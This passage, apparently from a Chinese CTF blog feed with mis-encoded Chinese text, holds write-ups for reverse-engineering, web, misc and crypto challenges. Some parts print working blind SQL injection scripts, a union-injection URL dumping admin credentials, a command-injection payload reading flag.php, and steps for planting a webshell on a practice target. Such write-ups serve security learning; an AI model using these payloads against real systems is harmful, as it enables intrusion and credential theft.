        fos.write(f2);
        fos.close();
    &#125;

    public static byte[] decrypt(byte[] x, byte[] y) &#123;
        int i = (byte)y.length;
        byte[] temp = new byte[x.length];
        for(int j = 0; j &lt; x.length; j++) &#123;
            temp[j] = ((byte)(x[j] ^ y[(j % i)]));
        &#125;
        return temp;
    &#125;

    public static byte[] toByteArray(String filename) throws IOException&#123;  

        File f = new File(filename);  
        if(!f.exists())&#123;  
            throw new FileNotFoundException(filename);  
        &#125;  

        ByteArrayOutputStream bos = new ByteArrayOutputStream((int)f.length());  
        BufferedInputStream in = null;  
        try&#123;  
            in = new BufferedInputStream(new FileInputStream(f));  
            int buf_size = 1024;  
            byte[] buffer = new byte[buf_size];  
            int len = 0;  
            while(-1 != (len = in.read(buffer,0,buf_size)))&#123;  
                bos.write(buffer,0,len);  
            &#125;  
            return bos.toByteArray();  
        &#125;catch (IOException e) &#123;  
            e.printStackTrace();  
            throw e;  
        &#125;finally&#123;  
            try&#123;  
                in.close();  
            &#125;catch (IOException e) &#123;  
                e.printStackTrace();  
            &#125;  
            bos.close();  
        &#125;  
    &#125;
&#125;
</code></pre>
<h2 id="10-pycåˆ†æ"><a href="#10-pycåˆ†æ" class="headerlink" title="10.pycåˆ†æ"></a>10.pycåˆ†æ</h2><p>â€“by  NexusHE</p>
<p>æœ¬é¢˜å…ˆç»™äº†ä¸€ä¸ªpycæ–‡ä»¶ï¼Œå°†å…¶åç¼–è¯‘åï¼Œå¾—åˆ°å¾ˆé•¿ä¸€ä¸²ä»£ç ï¼Œä»”ç»†å…³ç³»å‘ç°å…¶å†™æ³•ç±»ä¼¼äºå‡½æ•°å¼ç¼–ç¨‹è¯­è¨€ï¼Œåœ¨æ ¹æ®lambdaè§„åˆ™ç ”ç©¶ä¹‹åï¼Œä»£ç åŒ–ç®€è‡³ä»¥ä¸‹:</p>
<pre><code class="python">#Embedded file name: rev300.py
__g = globals()
__y = (lambda f: (lambda x: x(x))(lambda y: f(lambda : y(y)())))
string = (__import__(&#39;string&#39;, __g, __g))
table = (string.printable.strip())
&quot;&quot;&quot;
setbit = (lambda p, pos, value: (lambda __l: [ [ [ (lambda __target, __slice, __value: [ (lambda __target, __slice, __value: [ __l[&#39;p&#39;] for __target[__slice] in [(lambda __old: (lambda __ret: (__old | __value if __ret is NotImplemented else __ret))(getattr(__old, &#39;__ior__&#39;, lambda other: NotImplemented)(__value)))(__target[__slice])] ][0])(__l[&#39;p&#39;], __l[&#39;cpos&#39;], __l[&#39;value&#39;] &lt;&lt; __l[&#39;bpos&#39;]) for __target[__slice] in [(lambda __old: (lambda __ret: (__old &amp; __value if __ret is NotImplemented else __ret))(getattr(__old, &#39;__iand__&#39;, lambda other: NotImplemented)(__value)))(__target[__slice])] ][0])(__l[&#39;p&#39;], __l[&#39;cpos&#39;], ~(1 &lt;&lt; __l[&#39;bpos&#39;])) for __l[&#39;bpos&#39;] in [__l[&#39;pos&#39;] % 8] ][0] for __l[&#39;cpos&#39;] in [__l[&#39;pos&#39;] / 8] ][0] for __l[&#39;p&#39;], __l[&#39;pos&#39;], __l[&#39;value&#39;] in [(p, pos, value)] ][0])(&#123;&#125;))
setbit.__name__ = &#39;setbit&#39;
getbit = (lambda p, pos: (lambda __l: [ [ [ __l[&#39;p&#39;][__l[&#39;cpos&#39;]] &gt;&gt; __l[&#39;bpos&#39;] &amp; 1 for __l[&#39;bpos&#39;] in [__l[&#39;pos&#39;] % 8] ][0] for __l[&#39;cpos&#39;] in [__l[&#39;pos&#39;] / 8] ][0] for __l[&#39;p&#39;], __l[&#39;pos&#39;] in [(p, pos)] ][0])(&#123;&#125;))
getbit.__name__ = &#39;getbit&#39;
encode =  (lambda data, buf: (lambda __l: [ [ (lambda __items, __after, __sentinel: __y(lambda __this: lambda : (lambda __i: ([ [ __this() for __l[&#39;data&#39;][__l[&#39;i&#39;]] in [table.index(__l[&#39;data&#39;][__l[&#39;i&#39;]]) + 1] ][0] for __l[&#39;i&#39;] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))())(iter(xrange(__l[&#39;_len&#39;])), lambda : (lambda __items, __after, __sentinel: __y(lambda __this: lambda : (lambda __i: ([ [ [ __this() for __l[&#39;buf&#39;] in [setbit(__l[&#39;buf&#39;], __l[&#39;i&#39;], getbit(__l[&#39;data&#39;], __l[&#39;j&#39;]))] ][0] for __l[&#39;j&#39;] in [__l[&#39;i&#39;] / 6 * 8 + __l[&#39;i&#39;] % 6] ][0] for __l[&#39;i&#39;] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))())(iter(xrange(__l[&#39;_len&#39;] * 6)), lambda : __l[&#39;buf&#39;], []), []) for __l[&#39;_len&#39;] in [len(__l[&#39;data&#39;])] ][0] for __l[&#39;data&#39;], __l[&#39;buf&#39;] in [(data, buf)] ][0])(&#123;&#125;))
encode.__name__ = &#39;encode&#39;
&quot;&quot;&quot;
def setbit(p,pos,value):
    bpos = pos % 8
    cpos = pos / 8
    s = p
    s[cpos] = p[cpos] &amp; (~(1 &lt;&lt; bpos))
    s[cpos] = p[cpos] | (value &lt;&lt; bpos)
    return s
def getbit(p,pos):
    bpos = pos % 8
    cpos = pos / 8
    return p[cpos] &gt;&gt; bpos &amp; 1
def encode(data, buf):
    indexdata = []
    for i in xrange(len(data)):
        indexdata.append(table.index(data[i]) + 1)
    res = buf
    for i in xrange(len(data)*6):
        j = i / 6 * 8 + i % 6
        setbit(res, i, getbit(indexdata, j))
    return res
def encrypt():
    fin = open(&#39;key.txt&#39;, &#39;r&#39;)
    s = fin.read().strip()
    fin.close()
    ss = ([])
    sss = ([])
    __items = iter(s)
    __after = (lambda : [ [ (lambda __items, __after, __sentinel: __y(lambda __this: lambda : (lambda __i: ([ (lambda __value: [ __this() for __g[&#39;sssss&#39;] in [(lambda __ret: (__g[&#39;sssss&#39;] + __value if __ret is NotImplemented else __ret))(getattr(__g[&#39;sssss&#39;], &#39;__iadd__&#39;, lambda other: NotImplemented)(__value))] ][0])(chr(c)) for __g[&#39;c&#39;] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))())(iter(ssss), lambda : [ (fout.write(sssss), (fout.close(), None)[1])[1] for __g[&#39;fout&#39;] in [open(&#39;key1.enc&#39;, &#39;wb+&#39;)] ][0], []) for __g[&#39;sssss&#39;] in [&#39;&#39;] ][0] for __g[&#39;ssss&#39;] in [encode(ss, sss)] ][0])
    __sentinel = ([])
    __y(lambda __this: lambda : (lambda __i: ([ (ss.append(c), (sss.append(0), __this())[1])[1] for __g[&#39;c&#39;] in [__i] ][0] if __i is not __sentinel else __after()))(next(__items, __sentinel)))()
</code></pre>
<p>åŠ å¯†çš„å¤§ä½“è§„åˆ™ä¸ºæŠŠåŸå­—ç¬¦å­˜åœ¨tableçš„index+1åï¼ŒæŠŠå6ä½ä¿å­˜åˆ°åŠ å¯†åçš„æ–‡ä»¶é‡Œã€‚æ ¹æ®æ­¤ç¼–å†™è§£å¯†ä»£ç :</p>
<pre><code>def decrypt():
    fin = open(&#39;key.enc&#39;,&#39;rb&#39;)
    cipher = fin.read()
    plain = &#39;&#39;
    def decode3b(s):
        a = s &gt;&gt; 16
        b = (s &gt;&gt; 8) &amp; 0xFF
        c = s &amp; 0xff
        sa = bin(a)[2:].zfill(8)
        sb = bin(b)[2:].zfill(8)
        sc = bin(c)[2:].zfill(8)
        return table[int(sa[2:], 2)] + table[int(sb[4:] + sa[:2], 2)] + table[int(sc[6:] + sb[:4], 2)] + table[int(sc[:6], 2)]
    for i in xrange(0,len(cipher),3):
        s = int(cipher[i:i+3].encode(&#39;hex&#39;),16)
        plain += decode3b(s)
    print plain
    return &#39;&#39;.join(table[(table.index(c) + 63) % 64] for c in plain)
if __name__ == &#39;__main__&#39;:
print decrypt()
</code></pre>
<p>å¾—åˆ°</p>
<p>iiiiirrrrLfzea844d181c3249f6gtttggggggg0000000000000</p>
<p>hhhhhqqqqKeyd9733c070b2138e5fsssfffffffâ€â€â€â€â€â€â€â€â€â€â€â€â€</p>
<p>å»æ‰ä¹±ç åŠä¸€ä¸ªå†’å·å˜æˆâ€dâ€œï¼Œflagä¸ºkeyä¹‹åçš„ä¸€ä¸²å­—ç¬¦ä¸²:</p>
<p>9733c070b2138e5f</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬ä¸€æ¬¡é¶æœºçš„å°è¯•</title>
    <url>/2017/03/26/di-yi-ci-ba-ji-de-chang-shi/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸€ç»„çš„è¡¨å“¥ä»¬æ­äº†ä¸ªé¶æœºï¼Œè¿™ä¸‹æœ‰çš„ç©äº†ã€‚</p>
<a id="more"></a>

<h2 id="æ”¶é›†æ•°æ®"><a href="#æ”¶é›†æ•°æ®" class="headerlink" title="æ”¶é›†æ•°æ®"></a>æ”¶é›†æ•°æ®</h2><p>â€‹    è¾ƒè€ç‰ˆæœ¬çš„å—æ–¹æ•°æ®å»ºç«™ç³»ç»Ÿï¼Œæ¼æ´åº”è¯¥ä¸å°‘ï¼Œä¹Ÿåº”è¯¥æœ‰0dayï¼ŒæŸ¥ä¸€ä¸‹ï¼Œç›´æ¥ç”¨.</p>
<p>åœ¨æœç´¢é¡µé¢å­˜åœ¨æ³¨å…¥ã€‚è¿‡ä¸¤å¤©æ‰‹æ³¨å»ã€‚</p>
<pre><code>news_search.asp?key=7%&#39; union select 0,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9 from admin where 1 or &#39;%&#39;=&#39;&amp;otype=title&amp;Submit=%CB%D1%CB%F7</code></pre>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170326/180018566.png" alt="mark"></p>
<p>æŠŠpasswordä¸¢å»md5è§£å¯†ï¼Œå¾—åˆ°adminâ€”admin888;è¿›å…¥åå°ç®¡ç†ç³»ç»Ÿ</p>
<h2 id="ä¼ é©¬"><a href="#ä¼ é©¬" class="headerlink" title="ä¼ é©¬"></a>ä¼ é©¬</h2><p>â€‹    å› ä¸ºç½‘ç«™ä»£ç é—­åˆæœ‰é—®é¢˜ï¼Œæ‰€ä»¥åœ¨ç½‘ç«™ä»‹ç»ä¹‹ç±»çš„ä¿¡æ¯ä¸­æ’å…¥ä¸€å¥è¯ä¼šå´©æºƒã€‚å›æ¥å†è¯•è¯•ã€‚</p>
<p>â€‹    åå°å¯ä»¥ä¼ æ–‡ä»¶ï¼Œä½†æ˜¯é™åˆ¶ç±»å‹ï¼Œaspåç¼€çš„ä¼ ä¸ä¸Šå»ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170326/180655654.png" alt="mark"></p>
<p>â€‹    ä½†æ˜¯å®ƒè¿˜æœ‰æ•°æ®åº“å¤‡ä»½åŠŸèƒ½ï¼Œå°†å¤§é©¬åç¼€æ”¹ä¸ºjpgï¼Œä¸Šä¼ åä¼šç»™å‡ºå›¾ç‰‡æ‰€åœ¨è·¯å¾„ï¼Œé€šè¿‡æ•°æ®åº“å¤‡ä»½åŠŸèƒ½ï¼Œæ•°æ®åº“è·¯å¾„æ”¹ä¸ºæ–‡ä»¶åœ°å€ï¼Œå°†å›¾ç‰‡å¤‡ä»½ï¼Œè¿™é‡Œå°†å¤‡ä»½åå­—å†™<code>qwe.asp</code>ï¼Œå¤‡ä»½è¿”å›è·¯å¾„æ˜¯asaåç¼€ï¼Œå»æ‰asaåç¼€ï¼Œç›´æ¥è®¿é—®å°±å¥½äº†ã€‚</p>
<h2 id="æ‹¿shell"><a href="#æ‹¿shell" class="headerlink" title="æ‹¿shell"></a>æ‹¿shell</h2><p>å› ä¸ºé¶æœºåˆè¢«ç©åäº†==ï¼Œæ‰€ä»¥å…ˆåˆ°è¿™äº†ï¼Œä¹Ÿæ²¡æ³•æˆªå›¾ã€‚æ¢å¤åå†è¡¥ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ç«ç§CTF WriteUp</title>
    <url>/2017/07/03/huo-chong-ctf-writeup/</url>
    <content><![CDATA[<h1 id="ç«ç§CTF-WriteUp"><a href="#ç«ç§CTF-WriteUp" class="headerlink" title="ç«ç§CTF WriteUp"></a>ç«ç§CTF WriteUp</h1><p>â€‹                                                                â€”â€”-By  LANVNAL</p>
<h2 id="0X01-Web"><a href="#0X01-Web" class="headerlink" title="0X01 Web"></a>0X01 Web</h2><ul>
<li><h3 id="ç¬¬äºŒä¸ªweb"><a href="#ç¬¬äºŒä¸ªweb" class="headerlink" title="ç¬¬äºŒä¸ªweb"></a>ç¬¬äºŒä¸ªweb</h3><p>httpå¤´æ³¨å…¥åŠ åŸºäºæ—¶é—´çš„ç›²æ³¨ã€‚</p>
</li>
</ul>
<pre><code>#-*-coding:utf-8-*-
import requests
import string
url=&quot;http://aim.zhugeaq.com:82/&quot;
payloads=string.lowercase + string.uppercase + string.digits+&#39;&#123;&#39;+&#39;&#125;&#39;
flag=&quot;&quot;

for i in range(1,100):
    havetry=0
    for str in payloads:
        headers=&#123;&quot;x-forwarded-for&quot;:&quot;&#39; +(select case when (substring((select flag from flag ) from %d for 1 )=&#39;%s&#39;) then sleep(7) else 1 end ) and &#39;1&#39;=&#39;1&quot; %(i,str)&#125;
        try: 
            res=requests.get(url,headers=headers,timeout=7)
        except requests.exceptions.ReadTimeout, e:
            havetry=1
            flag = flag + str
            print &quot;flag:&quot;, flag
            break
    if havetry==0:
        break
print &#39;flag:&#39; + flag</code></pre>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><ul>
<li><h3 id="passwd-is-flag"><a href="#passwd-is-flag" class="headerlink" title="passwd is flag"></a>passwd is flag</h3></li>
</ul>
<pre><code># -*- coding: utf-8 -*-
import requests
url = &#39;http://aim.zhugeaq.com:83/&#39;
def check(payload):
    postdata = &#123;&#39;username&#39;:&#39;1&#39;,&#39;password&#39;:payload&#125;
    r = requests.post(url, postdata).content
    return &#39;admin_r&#39; in r

password  = &#39;flag&#123;9&#39;
s = r&#39;0123456789:abcdefg|~&#39;
for t in xrange(33):
    for i in s:
        payload = &#39;1\&#39; or 1 union select 1,2,\&#39;%s\&#39; order by 3#&#39; % (password+i)
        if check(payload):
            password = password + chr(ord(i)-1)
            print password
            break</code></pre>
<ul>
<li><h3 id="ç¬¬å››ä¸ªWeb"><a href="#ç¬¬å››ä¸ªWeb" class="headerlink" title="ç¬¬å››ä¸ªWeb"></a>ç¬¬å››ä¸ªWeb</h3><p>å‘½ä»¤æ‰§è¡Œï¼Œé™åˆ¶é•¿åº¦ï¼Œ1.1.1.1è¿™æ ·å°±ç¬¦åˆæ¡ä»¶çš„æƒ…å†µä¸‹ç¼©çŸ­é•¿åº¦ï¼Œå†|åŠ ä¸Šå‘½ä»¤å°±å¥½ã€‚</p>
<blockquote>
<p>ip=1.1.1.1|ls</p>
<p>ip=1.1.1.1|cat flag.php</p>
</blockquote>
</li>
</ul>
<ul>
<li><h3 id="æœ€åä¸€ä¸ªWeb"><a href="#æœ€åä¸€ä¸ªWeb" class="headerlink" title="æœ€åä¸€ä¸ªWeb"></a>æœ€åä¸€ä¸ªWeb</h3><p>burpsuitæŠ“åŒ…ï¼Œpostä¼ å‚ã€‚Fuzzæµ‹è¯•ï¼Œè¿‡æ»¤æ‰äº†<code>or # - ç©ºæ ¼ % ...   </code>,å¯ç”¨<code>= () &#39;&#39;</code>,è¿›è¡Œå¸ƒå°”ç›²æ³¨ã€‚</p>
</li>
</ul>
<pre><code># -*- coding: utf-8 -*-
import requests
url = &#39;http://aim.zhugeaq.com:85/01/login.php&#39;
def check(payload):
    postdata = &#123;&#39;username&#39;:payload,&#39;pass&#39;:&#39;xx&#39;&#125;
    r = requests.post(url, postdata).content
    return &#39;å¯†ç é”™è¯¯&#39; in r

password  = &#39;&#39;
s = r&#39;0123456789abcdef&#39;

for i in xrange(32,0,-1):
    for c in s:
        payload = &#39;\&#39;=(mid((select(pass)from(admin))from(%d))=\&#39;%s\&#39;)=\&#39;0&#39; % (i, (c+password))
        if check(payload):
            password = c + password
            break
    print password</code></pre>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><ul>
<li><h3 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h3></li>
</ul>
<blockquote>
<p>å¯¹åº”å­—æ¯æ›¿æ¢ï¼Œæ ¹æ®ç¬¬ä¸€è¡Œæ›¿æ¢å¾—å‡ºçš„å­—æ¯è¡¨å°±èƒ½çœ‹å‡ºè¿™æ˜¯rot13ï¼Œç›´æ¥å¯¹åº”rot13çš„è„šæœ¬å¾—å‡ºflagã€‚</p>
</blockquote>
<pre><code>#jrecbi]gyu8
e.u pry(owRuuo.yQ)S
    e.u &#123;pry(jd)S
        ypfS
            aoj ] rpe(jd)
        .qj.lyS
            p.ygpb jd
        cu (aoj V 96) abe (aoj W 123)S
            p.ygpb jdp((aoj[97&#125;Ruuo.yQ)v&#123;&#123;mre&#123;&#123;(26) &#125; 97)
        .ncu (aoj V 64) abe (aoj V 91)S
            p.ygpb jdp((aoj[65&#125;Ruuo.yQ)v&#123;&#123;mre&#123;&#123;(26) &#125; 65)
        .no.S
            p.ygpb jd

    p.ygpb --vhrcb(/&#123;pry( j ) urp j cb o=)

lpcby pry( -qpn?popbpo.+-w 13 )

////////////////////////////
key&#123;efeaefr&#125;
////////////////////////////
# -*- coding: utf-8 -*-             &lt;--------å…¥æ‰‹ç‚¹
def rot(s,OffsetX):
    def _rot(ch):
        try:
            asc = ord(ch)
        except:
            return ch
        if (asc &gt; 96) and (asc &lt; 123):
            return chr((asc-97+OffsetX).__mod__(26) + 97)
        elif (asc &gt; 64) and (asc &lt; 91):
            return chr((asc-65+OffsetX).__mod__(26) + 65)
        else:
            return ch

    return &#39;&#39;.join([_rot( c ) for c in s])</code></pre>
<ul>
<li><h3 id="ä¸­å›½èœåˆ€"><a href="#ä¸­å›½èœåˆ€" class="headerlink" title="ä¸­å›½èœåˆ€"></a>ä¸­å›½èœåˆ€</h3><p>binwalkæå–â€“&gt;å¾—åˆ°å‹ç¼©åŒ…â€“&gt;è§£å‹ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/010324040.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="æˆ‘å¿ƒæ°¸æ’"><a href="#æˆ‘å¿ƒæ°¸æ’" class="headerlink" title="æˆ‘å¿ƒæ°¸æ’"></a>æˆ‘å¿ƒæ°¸æ’</h3><p>éŸ³é¢‘éšå†™</p>
<p>mp3stegoæå–ã€‚å¯†ç åœ¨æ–‡ä»¶ä¸­æœç´¢ï¼Œflagåœ¨è¾“å‡ºçš„txtæ–‡ä»¶ä¸­ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/011100377.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/011114406.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="æˆªè·ä¸€ä¸ªæ–‡ä»¶"><a href="#æˆªè·ä¸€ä¸ªæ–‡ä»¶" class="headerlink" title="æˆªè·ä¸€ä¸ªæ–‡ä»¶"></a>æˆªè·ä¸€ä¸ªæ–‡ä»¶</h3><p>ç¼–è¾‘å™¨æŸ¥çœ‹æ–‡ä»¶â€“&gt;base64è§£å¯†</p>
</li>
</ul>
<ul>
<li><h3 id="æ‰¾key"><a href="#æ‰¾key" class="headerlink" title="æ‰¾key"></a>æ‰¾key</h3><p>å›¾ç‰‡æ”¹æ ¼å¼ä¸ºzipï¼Œæ˜¯ä¼ªåŠ å¯†ï¼Œä¿®æ”¹åè§£å‹å‡ºç¬¬äºŒå¼ å›¾ç‰‡ï¼Œpngcheckæ£€æŸ¥åå‘ç°IENDå—åæœ‰é™„åŠ æ•°æ®ï¼ŒWinHexæ‰“å¼€,æœ€åé¢çš„å­—ç¬¦ä¸²å‡¯æ’’ä½ç§»ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/011710014.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="æ‰¾é¼¹é¼ "><a href="#æ‰¾é¼¹é¼ " class="headerlink" title="æ‰¾é¼¹é¼ "></a>æ‰¾é¼¹é¼ </h3><p>ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œè§£å‹åbinwalkåˆ†æçœ‹åˆ°äº†extï¼Œç›´æ¥æŒ‚è½½æŸ¥çœ‹åˆ°flagã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/013656052.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="æ— çº¿"><a href="#æ— çº¿" class="headerlink" title="æ— çº¿"></a>æ— çº¿</h3><p>åŠ å¯†çš„RARå‹ç¼©æ–‡ä»¶â€“&gt;çˆ†ç ´å¾—å¯†ç 12345â€“&gt;wiresharkåˆ†æ</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/014252986.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="æµ·è´¼ç‹"><a href="#æµ·è´¼ç‹" class="headerlink" title="æµ·è´¼ç‹"></a>æµ·è´¼ç‹</h3><p>foremostä»Thums.dbæå–å‡º2å¼ å›¾ç‰‡ï¼Œflagè—åœ¨é¢˜ç›®ç»™å‡ºçš„ä¸€å †å›¾ç‰‡é‡Œå’Œè¿™2å¼ ä¸€æ ·çš„ä¸€å¼ é‡Œã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/014847131.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/014903597.png" alt="mark"></p>
</li>
</ul>
<ul>
<li><h3 id="è¿™æ˜¯ä»€ä¹ˆ"><a href="#è¿™æ˜¯ä»€ä¹ˆ" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆ"></a>è¿™æ˜¯ä»€ä¹ˆ</h3><p>ç¼–è¾‘å™¨æ‰“å¼€ï¼Œæœ‰ä¸€ä¸²å­—ç¬¦ï¼ŒHTMLå®ä½“ç¼–ç ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/015224308.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/015243539.png" alt="mark"></p>
</li>
</ul>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><ul>
<li><h3 id="Unicodeç¼–ç "><a href="#Unicodeç¼–ç " class="headerlink" title="Unicodeç¼–ç "></a>Unicodeç¼–ç </h3></li>
</ul>
<blockquote>
<p>\u606d\u559c\u60a8\uff01\u006b\u0065\u0079\u007b\u0074\u0068\u0065\u0020\u0066\u0069\u0072\u0073\u0074\u0020\u006b\u0065\u0079\u007d</p>
</blockquote>
<p>â€‹    åœ¨çº¿è½¬æ¢å³å¯ã€‚ï¼ˆ<a href="http://www.msxindl.com/tools/unicode16.asp%EF%BC%89">http://www.msxindl.com/tools/unicode16.aspï¼‰</a></p>
<ul>
<li><h3 id="Base64-32"><a href="#Base64-32" class="headerlink" title="Base64+32"></a>Base64+32</h3></li>
</ul>
<blockquote>
<p>Tk5TWFM2M0pPTlJXR1kzR09KVEdPNURCTVZUR0NaM1NOQjJIMj09PQ== </p>
</blockquote>
<p>â€‹    Base64+32è§£å¯†</p>
<ul>
<li><h3 id="å‡¯æ’’"><a href="#å‡¯æ’’" class="headerlink" title="å‡¯æ’’"></a>å‡¯æ’’</h3></li>
</ul>
<blockquote>
<p>æˆ‘æ¥ï¼Œæˆ‘è§ï¼Œæˆ‘å¾æœ e6Z9i<del>]8R</del>U<del>QHE{RnY{QXg</del>QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA</p>
</blockquote>
<p>â€‹    è„šæœ¬è·‘å‡ºæ¥base64ï¼Œå†è§£base64.</p>
<ul>
<li><h3 id="è´¹å¨œå§†å¯†ç "><a href="#è´¹å¨œå§†å¯†ç " class="headerlink" title="è´¹å¨œå§†å¯†ç "></a>è´¹å¨œå§†å¯†ç </h3></li>
</ul>
<blockquote>
<p>äºŒæˆ˜æ—¶ç›Ÿå†›æˆªè·å¾·å†›ä¸€æ®µå¯†ç ï¼Œå¯†æ–‡ä¸ºï¼š00000100001000001101000001100001010ï¼ˆå¯†é’¥ï¼šlargeï¼‰</p>
</blockquote>
<blockquote>
<p>å¼‚æˆ–åŠ å¯†</p>
<p>00000100001000001101000001100001010</p>
<p>ç„¶åå¯†é’¥largeï¼Œè½¬æ¢æˆ7ä½çš„ASCIIï¼š11011001100001111001011001111100101</p>
<p>å¼‚æˆ–æ“ä½œ</p>
<p>0110111001101001011010000110000101101111</p>
<p>ASCIIè½¬æ¢æˆå­—ç¬¦ï¼šnihao</p>
<p>key{nihao}</p>
<p><a href="http://www.360doc.com/content/15/0222/14/21874787_450053353.shtml">http://www.360doc.com/content/15/0222/14/21874787_450053353.shtml</a></p>
</blockquote>
<ul>
<li><h3 id="MD5çˆ†ç ´"><a href="#MD5çˆ†ç ´" class="headerlink" title="MD5çˆ†ç ´"></a>MD5çˆ†ç ´</h3></li>
</ul>
<blockquote>
<p>å°æ˜å…¥ä¾µç½‘ç«™åè·å¾—äº†ç®¡ç†å‘˜çš„å¯†æ–‡ï¼Œç”±äºå¤ªé«˜å…´äº†æ‰‹ä¸€æŠ–æŠŠå¯†æ–‡åˆ é™¤äº†ä¸€éƒ¨åˆ†ï¼Œåªå‰©ä¸‹å‰10ä½d9ddd1800fï¼Œå°æ˜æ ¹æ®ç¤¾å·¥çŸ¥é“ç®¡ç†å‘˜çš„å¯†ç ä¹ æƒ¯æ˜¯4ä½çš„æ•°å­—åŠ å­—æ¯ï¼Œä½ èƒ½å¸®å°æ˜æ¢å¤å¯†ç çš„å“ˆå¸Œå€¼å—ï¼Ÿï¼ˆæç¤ºï¼šflagä¸ºå¯†ç çš„å“ˆå¸Œå€¼ï¼‰</p>
</blockquote>
<pre><code># -*- coding:utf-8 -*- 
import hashlib
import string
md5=&#39;d9ddd1800f&#39;
s=string.lowercase + string.uppercase + string.digits
for a in s:
    for b in s:
        for c in s:
            for d in s:
                st=a+b+c+d
                flag=hashlib.md5(st).hexdigest()
                if(flag[0:10]==md5[0:10]):
                    print flag
                    break</code></pre>
<ul>
<li><h3 id="hashç ´è§£"><a href="#hashç ´è§£" class="headerlink" title="hashç ´è§£"></a>hashç ´è§£</h3></li>
</ul>
<blockquote>
<p>ä½ çŒœè¿™æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œè®°å¾—ç ´è§£åæŠŠå…¶ä¸­çš„å¯†ç ç»™æˆ‘ã€‚ 00031141:Administrator:s1riu5:C6AE3F7D7534AE05AAD3B435B51404EE:65D4F6EC4BE18E14F3665804EF1E9496ï¼ˆç­”æ¡ˆä¸ºéå¸¸è§„å½¢å¼ï¼‰</p>
</blockquote>
<p>â€‹    åœ¨çº¿è§£å¯†ï¼ˆ<a href="http://www.objectif-securite.ch/ophcrack.php%EF%BC%89">http://www.objectif-securite.ch/ophcrack.phpï¼‰</a></p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><ul>
<li><h3 id="æ³¨å†Œç "><a href="#æ³¨å†Œç " class="headerlink" title="æ³¨å†Œç "></a>æ³¨å†Œç </h3></li>
</ul>
<blockquote>
<p>Tå›æ³¨å†Œäº†ä¸€ä¸ªè½¯ä»¶ï¼Œç”¨æˆ·åä¸ºanyuntecï¼Œä½†æ˜¯èµ°ç€èµ°ç€æ‘”äº†ä¸€è·¤ï¼Œçˆ¬èµ·æ¥ä¸€æƒ³ï¼Œæ³¨å†Œç ç»™å¿˜äº†ï¼Œä½ èƒ½å¸®åŠ©Tå›æ‰¾å‡ºæ³¨å†Œç å—ï¼Ÿ</p>
</blockquote>
<p>IDAåç¼–è¯‘åçœ‹ä¸»è¦ä»£ç ï¼Œå°±æ˜¯è¦æ±‚æ³¨å†Œç å¯¹äºç”¨æˆ·åæ¯ä¸€ä½åç§»8-i(iä»0é€’å¢)ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170705/020100031.png" alt="mark"></p>
<ul>
<li><h3 id="APK"><a href="#APK" class="headerlink" title="APK"></a>APK</h3><p>å°†paramString1çš„å€¼MD5åŠ å¯†ï¼Œæ¯éš”2ä¸ªå­—ç¬¦å–ä¸€ä¸ªå­—ç¬¦ï¼Œæœ€åæ‹¼èµ·æ¥å°±æ˜¯flagã€‚</p>
</li>
</ul>
<pre><code>import hashlib

par1 = b&quot;Tenshine&quot;

def checkSN(par1):
    if par1:
        # if par2 and len(par2) == 22:  
        m2 = hashlib.md5()   
        m2.update(par1)   
        par1_md5 = m2.hexdigest()
        print(par1_md5)
        par1 = toHexString(par1_md5)
        print(par1)
        what = &quot;&quot;
        i = 0
        while i &lt; len(par1_md5):
            what += par1_md5[i]
            i += 2
        print(&quot;flag&#123;&quot;+ what +&quot;&#125;&quot;)


def toHexString(s):
    lst = &quot;&quot;
    for ch in s:
        hv = hex(ord(ch)).replace(&#39;0x&#39;, &#39;&#39;)
        if len(hv) == 1:
            hv = &#39;0&#39;+hv
        lst += hv
    return lst

checkSN(par1)</code></pre>
<ul>
